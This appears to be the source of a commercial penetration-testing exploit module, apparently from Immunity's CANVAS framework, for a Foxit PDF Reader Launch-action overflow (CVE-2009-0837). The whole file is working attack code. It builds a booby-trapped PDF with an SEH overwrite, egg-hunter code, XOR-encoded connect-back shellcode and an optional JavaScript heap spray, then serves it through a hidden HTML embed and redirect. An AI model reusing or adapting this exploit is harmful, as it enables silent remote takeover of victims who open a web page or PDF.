#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: 
    sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside

NAME                                = 'Foxit PDF Reader Action Overflow'
DESCRIPTION                         = 'Foxit PDF Reader Action Overflow'
VERSION                             = '1.0'

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = "Foxit Software"
DOCUMENTATION['Date public']        = '03/09/2009'
DOCUMENTATION['References']         = 'http://www.foxitsoftware.com/pdf/reader/security.htm'
DOCUMENTATION['Repeatability']      = ''
DOCUMENTATION["CERT Advisory"]      = 'None'
DOCUMENTATION['VersionsAffected']   = 'Foxit Reader 3.0 (build < 1506)'
DOCUMENTATION["CVE Name"]           = "CVE-2009-0837"
DOCUMENTATION["CVE Url"]            = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0837"
DOCUMENTATION['CVSS'] = 10.0

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Clientside'
PROPERTY['ARCH']                    = [['Windows']]
PROPERTY['VERSION']                 = ['2000','XP']
PROPERTY['DELIVERY']                = 'HTTP'

NOTES = """
Tested on:
Windows XP Professional SP2 English UP2DATE with Foxit Reader 3.0 Build 1301
Windows 2000 SP4 English with Foxit Reader 3.0 Build 1301
"""

# info, heapspray location, SE location, SEH overwrite
targets =   {   0 : ['Windows - Heap Spray', 1345, 0x03030303], 
                1 : ['Windows - XP SP2 English (SafeSEH searchcode)', 1345, 0x74D31567], # oledlg.dll is not SafeSEH protected 
                2 : ['Windows - 2000 SP4 English (SafeSEH searchcode)', 1345, 0x76FA16A5] # pop pop ret
            }
        
from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion  = 1
        self.badstring      = '\0\xff\x2f'
        self.name           = NAME 
        self.htmlfilename   = 'file.html'
        self.source_pdf     = 'Resources/blank.pdf'
        self.dest_pdf       = 'temp.pdf'
        #self.pdfdirectory   = 'Resources'
        self.version        = 1
        self.tag            = struct.unpack('<L', 'c00k')[0]
        
        return

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port
        
        self.log('Connect back information: %s:%d' % (host,port))
        proxy_payload = ''
        try:
            # this stuff is only used when served in HTTP MOSDEF mode
            if hasattr(self, 'HTTPMOSDEF') and self.HTTPMOSDEF == True:
                # make sure that fromcreatethread is set to 0 in your
                # httpserver/exploit listenerArgsDict!
                import shellcode.standalone.windows.payloads as payloads

                p   = payloads.payloads()
                sc  = p.http_proxy(self.callback.ip, self.callback.port, self.useSSLMOSDEF)
                proxy_payload = p.assemble(sc)
        except:
            proxy_payload = ''
            
        rawshellcode = self.createInjectToSelf(host, port,\
                                               injectme=proxy_payload,\
                                               movetostack=True)
        
        # simple XOR encoder for space ...

        # main payload
        self.shellcode = ''
        for n in range(0, 256):
            encoder = xorencoder.simpleXOR(n)
            encoder.setbadstring(self.badstring)
            self.shellcode = encoder.encode(rawshellcode)
            if self.shellcode != '':
                print "XXX: success with key: %.2X" % n
                break
        if self.shellcode == '':
            print "XXX: could not encode shellcode oh no!"
            raise Exception, "failed encoder"
        
        sc = shellcodeGenerator.win32()
        sc.addAttr('SearchCodeSafeSEH', { 'tag': self.tag })
        sc.standalone = 1
        
        # searchcode here, use regular chunked encoder
        from encoder import chunkedaddencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        
        self.searchcode = encoder.encode(sc.get() + "ABCD")
        
        #print repr(self.shellcode)
        #print "XXX: %d" % len(self.shellcode)
        return self.shellcode
        
    def makePDF(self):
        js = """
        var payload = unescape("SHELLCODE"); 
        var nop ="";
        for (i=64;i>=0;--i) 
            nop += unescape("%u9090%u9090%u9090%u9090%u9090");
        heapblock = nop + payload;
        bigblock = unescape("%u9090%u9090");
        headersize = 20;
        spray = headersize+heapblock.length
        while (bigblock.length<spray) 
            bigblock+=bigblock;
        fillblock = bigblock.substring(0, spray);
        block = bigblock.substring(0, bigblock.length-spray);
        while(block.length+spray < 0x20000) 
            block = block+block+fillblock;
        mem = new Array();
        for (i=0;i<700;i++) 
            mem[i] = block + heapblock;
        """.replace('SHELLCODE', urluencode(self.shellcode + "DUDEDUDE"))#without padding foxit process will use 100% of the cpu and we our connectback doesn't work correctly ... 
        
        self.log("opening %s"%self.source_pdf)
        input = PdfFileReader(file(self.source_pdf, 'rb'))
        page = input.getPage(0)
      
        self.setLaunchAction(input, page)
        
        #if we are using heapspray then we don't need the shellcode in the /Producer object
        if self.version==0:
            self.log("Injecting javascript heapspray into pdf...")
            self.setJS(input, js)
            output = PdfFileWriter(Insert=False)
        else:
            print "XXX: SETTING PRODUCER STRING FROM FOXIT ACTION"
            output = PdfFileWriter(Insert=True,producer="c00k" + self.shellcode)
        
        output.addPage(page)
        root = output._root.getObject()
        
        if self.version==0:
            root.update({NameObject('/Names'):input.trailer['/Root']['/Names']}) #only needed when adding javascript.  now that we can supply our our file it is possible that the source_pdf wont have this and you will get a KeyError
        output.write(file(self.dest_pdf,'wb'))
        return file(self.dest_pdf,'rb').read()
    
    def setJS(self, input, content):
        #create the js entry first
        input.trailer['/Root'][NameObject('/Names')] = DictionaryObject()
        input.trailer['/Root']['/Names'][NameObject('/JavaScript')] = DictionaryObject()
        input.trailer['/Root']['/Names']['/JavaScript'][NameObject('/Names')] = ArrayObject()
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(TextStringObject('Spray'))
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(DictionaryObject())
        input.trailer['/Root'][NameObject('OpenAction')] = DictionaryObject()

        #set the js content
        jsobject = StreamObject()
        jsobject._data = content
        
        jsdict=input.trailer['/Root']['/Names']['/JavaScript']['/Names'][1].getObject()
        jsdict[NameObject('/S')] = NameObject('/JavaScript')
        jsdict[NameObject('/JS')] = jsobject.flateEncode()
        
        
        
    def setLaunchAction(self, input, page):
        action = DictionaryObject()
        action[NameObject("/Type")] = NameObject("/Action")
        action[NameObject("/S")] = NameObject("/Launch")
        action[NameObject("/NewWindow")] = BooleanObject(True)
        action[NameObject("/F")] = DictionaryObject()
        
        pointer_to_next = "AAAA"
        SE_Handler = struct.pack('<L', targets[self.version][2])
        SE_Offset = targets[self.version][1]
        
                
        if len(self.searchcode) > SE_Offset:
            print "Search shellcode too big :( adjusting to int3" % len(self.searchcode)
            self.searchcode = '\xcc' * 1200
            
        action["/F"][NameObject("/F")] = createStringObject("/C/"                                   +\
                                                            self.searchcode                         +\
                                                            'A' * (SE_Offset - len(self.searchcode))+\
                                                            'AA' + mosdef.assemble('jmp $8', 'X86') +\
                                                            SE_Handler                              +\
                                                            'P' * 4                                 +\
                                                            # around 850 bytes room till end of stack
                                                            mosdef.assemble('jmp $-%d'%(5+12+SE_Offset), 'X86')
                                                            )
        
        page[NameObject("/Annots")] = ArrayObject((DictionaryObject(),))
        page["/Annots"][0][NameObject("/Type")] = NameObject("/Annot")
        page["/Annots"][0][NameObject("/Subtype")] = NameObject("/Screen")
        page["/Annots"][0][NameObject("/Rect")] = ArrayObject((NumberObject(0),NumberObject(0),NumberObject(800),NumberObject(800)))
        page["/Annots"][0][NameObject("/AA")] = DictionaryObject()
        page["/Annots"][0]["/AA"][NameObject("/PV")] = action
        
    def makeHTML(self):
        webpage = "<HTML>\n"
        webpage += "<EMBED src=\"%s\" HIDDEN=\"TRUE\" ></EMBED>\n"%(self.dest_pdf)
        webpage += "</HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h = header('SERVER')
        b = body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type', 'text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            self.createShellcode()
            b.setBody(self.makePDF())
            h.addHeader('Content-Type', 'application/pdf')
        else:
            self.log('redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.htmlfilename)
            h.addHeader('Content-Type', 'text/html')
        return h,b

    def getArgs(self):
        self.host = self.target.interface
        self.dest_pdf = self.argsDict.get('dest_filename',self.dest_pdf)
        self.source_pdf = self.argsDict.get('source_filename', self.source_pdf)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.filedata = self.makePDF()
        self.log('Opening %s for output' % (self.dest_pdf))
        fd = file(self.dest_pdf,'wb+')
        fd.write(self.filedata)
        fd.close()
        self.log('Wrote to %s' % (self.dest_pdf))
        return 1
    
      
if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
